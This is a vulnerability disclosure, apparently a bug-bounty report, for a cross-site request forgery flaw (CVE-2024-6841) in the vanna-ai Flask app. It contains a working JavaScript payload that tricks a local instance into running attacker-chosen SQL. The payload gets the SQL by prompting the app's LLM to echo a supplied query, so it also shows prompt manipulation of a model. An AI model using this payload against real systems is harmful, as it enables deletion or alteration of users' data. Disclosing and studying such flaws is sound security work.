Title: CSRF on endpoint for running arbitrary SQL commands in vanna-ai/vanna

Proof of Concept: 
Run an instance of the built-in Flask app, and connect it to a database. Something like this would work:

from vanna.remote import VannaDefault
from vanna.flask import VannaFlaskApp
vn = # Your vanna-instance here
vn.connect_to_sqlite('your_url_here')

app = VannaFlaskApp(vn)
app.run()

Host the following payload on a website:

<script>
    var req = new XMLHttpRequest();
    // This sets the value of `sql` in the cache to be equal to whatever query the model generates.
    // If you just ask it nicely enough, it will just return the query that you want it to.
    // The function in question is https://github.com/vanna-ai/vanna/blob/56b782bcefd2e59b19cd7ba7878b95f54884f502/src/vanna/flask/__init__.py#L329
    req.open('GET', 'http://localhost:8084/api/v0/generate_sql?question=RETURN%20THE%20%FOLLOWING%20QUERY%20:...');
    req.withCredentials = false;
    req.send();
    
    setTimeout(() => {
        req = new XMLHttpRequest();
        // This then runs the SQL query stored in the cache. The ID is used for something later in the function,
        // but is not relevant here.
        // The function in question is https://github.com/vanna-ai/vanna/blob/56b782bcefd2e59b19cd7ba7878b95f54884f502/src/vanna/flask/__init__.py#L411
    req.open('GET', 'http://localhost:8084/api/v0/run_sql?id=asdf');
    req.withCredentials = false;
    req.send();
        // Be sure to set a timeout that allows for the LLM to respond (and the previous function call to finish) before firing the next request.
    }, 4000);
</script>

Visit the website as the target.

Impact: 
This vulnerability makes it possible for an attacker to run arbitrary SQL commands via CSRF without the target intending to expose the web-app to the network/other users. Since the attacker cannot read the results of the query, the vulnerability is limited to data alteration/deletion.

CVE ID: CVE-2024-6841
Status: (assigned)
Vulnerability Type: CWE-352: Cross-Site Request Forgery (CSRF)
Severity: Medium (6.5)
Attack Vector: Network
Attack Complexity: Low
Privileges Required: None
User Interaction: Required
Scope: Unchanged
Confidentiality: None
Integrity: High
Availability: None
Registry: Other
Affected Version: Latest commit, main branch, 56b782bcefd2e59b19cd7ba7878b95f54884f502
Visibility: Public
Status: Awaiting fix
Disclosure Bounty: $75
Fix Bounty: $15
